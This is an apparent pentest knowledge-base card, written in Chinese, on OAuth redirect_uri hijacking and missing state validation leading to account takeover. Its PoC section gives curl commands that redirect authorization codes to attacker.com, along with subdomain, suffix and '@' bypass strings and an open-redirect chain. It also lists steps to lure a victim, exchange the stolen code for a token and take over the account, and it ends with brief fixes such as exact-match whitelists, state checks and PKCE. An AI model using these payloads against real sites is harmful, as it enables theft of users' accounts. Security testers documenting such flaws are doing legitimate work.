---
title: OAuth redirect_uri 劫持 / state 缺失（账号接管）
cve: 无（实现缺陷）
severity: high
cvss: 8.6
product: 自研三方登录（Google/微信/Telegram）
versions: 任意
ports: 80, 443
keywords: oauth, redirect_uri, state, 登录, 接管, sso
entry: /oauth/authorize?redirect_uri= 可篡改
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

```
GET /oauth/authorize?client_id=..&redirect_uri=..&response_type=code
回调页 /oauth/callback?code=
```

## 前置条件

- 回调域名校验不严（前缀/后缀/子域/开放重定向）。

## PoC

```bash
# 1) 改回调到攻击者域
curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://attacker.com/cb&response_type=code&state=x' \
  | grep -i location
# Location 里带 attacker.com 且 code= = 命中

# 2) 子域/后缀绕过
#   https://target.com.attacker.com
#   https://attacker.com/target.com
#   https://target.com@attacker.com
# 3) 用站内开放重定向做跳板（/jump?url=）
curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://target/jump?url=https://attacker.com&response_type=code'
```

```bash
# 4) 另测 state 缺失：去掉 state 看是否仍接受（可 CSRF 绑定攻击者账号）
```

## 利用步骤

1. 先测严格匹配是否被绕过（只读看 Location）；
2. 命中后诱导受害者点链接，code 落到攻击者；
3. 用 code 换 token → 接管；
4. 证据：Location 头 + code 落地记录。

## 修复与缓解

- redirect_uri 白名单精确匹配；强制 state 且一次性校验；code 绑定 PKCE。

## 参考

- OAuth 2.0 安全最佳实践；CWE-601。
